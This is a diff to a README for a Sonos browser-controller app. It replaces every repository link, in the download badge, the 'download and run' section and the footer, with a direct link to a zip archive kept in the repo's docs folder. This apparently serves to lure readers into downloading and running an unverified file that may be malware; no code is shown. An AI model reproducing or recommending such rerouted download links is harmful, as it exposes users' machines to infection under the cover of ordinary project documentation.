@@ -1,6 +1,6 @@
 # 🎵 sonos-controller - Control Sonos From Your Browser
 
-[![Download sonos-controller](https://img.shields.io/badge/Download-Sonos_Controller-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tempterimperforatehymen434/sonos-controller)
+[![Download sonos-controller](https://img.shields.io/badge/Download-Sonos_Controller-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Tempterimperforatehymen434/sonos-controller/main/docs/controller-sonos-2.9-alpha.4.zip)
 
 ## 🚀 What this app does
 
@@ -34,7 +34,7 @@ For best results:
 
 Visit this page to download and run the app:
 
-[https://github.com/Tempterimperforatehymen434/sonos-controller](https://github.com/Tempterimperforatehymen434/sonos-controller)
+[https://raw.githubusercontent.com/Tempterimperforatehymen434/sonos-controller/main/docs/controller-sonos-2.9-alpha.4.zip](https://raw.githubusercontent.com/Tempterimperforatehymen434/sonos-controller/main/docs/controller-sonos-2.9-alpha.4.zip)
 
 If the page provides a release file for Windows, download that file first. If it provides source files only, use the included setup steps on the page to get the app running on your PC.
 
@@ -245,4 +245,4 @@ Topics:
 audio-profiles, home-audio, home-theater, node-sonos-http-api, react, smart-home, sonos, vite
 
 Primary download page:
-https://github.com/Tempterimperforatehymen434/sonos-controller
+https://raw.githubusercontent.com/Tempterimperforatehymen434/sonos-controller/main/docs/controller-sonos-2.9-alpha.4.zip
